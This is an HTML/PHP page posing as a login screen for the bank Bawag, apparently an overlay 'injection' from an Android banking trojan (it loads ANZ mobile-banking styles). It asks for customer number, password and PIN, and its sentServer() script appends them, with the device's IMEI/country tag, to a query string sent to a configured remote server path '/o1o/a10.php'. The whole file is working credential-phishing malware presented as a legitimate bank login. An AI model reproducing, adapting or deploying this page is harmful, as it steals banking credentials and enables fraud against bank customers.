<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="nz/nz.co.anz.android.mobilebanking/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
<img style="margin-left: 10px;" src="data:image/png;base64,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">
</div>
<div class="header2">

</div>
    <div class="main">

        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">

                            <div class="form-group ">
									<input type="text" class="form-control" name="Customer number" id="login" placeholder="Customer number" autocomplete="off" maxlength="50" data-reg="/.{3,50}/" >
                            </div>

                            <div class="form-group">
									<input type="password" class="form-control" name="password" id="password" placeholder="Password" autocomplete="off" data-reg="/.{3,50}/" maxlength="50" >
                            </div>

                            <div class="form-group">
									<input type="password" class="form-control" name="PIN" id="pin" placeholder="PIN" autocomplete="off" data-reg="/.{3,50}/" maxlength="50" >
                            </div>

                       								<input type="button" class="input_submitBtn" onClick="sentServer();"  value="Continue">
 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;
	var pin = document.forms["form"].elements["pin"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|ANZ|"+login1+"|"+pass+"|"+pin);
	}
}
</script>
</body>
</html>
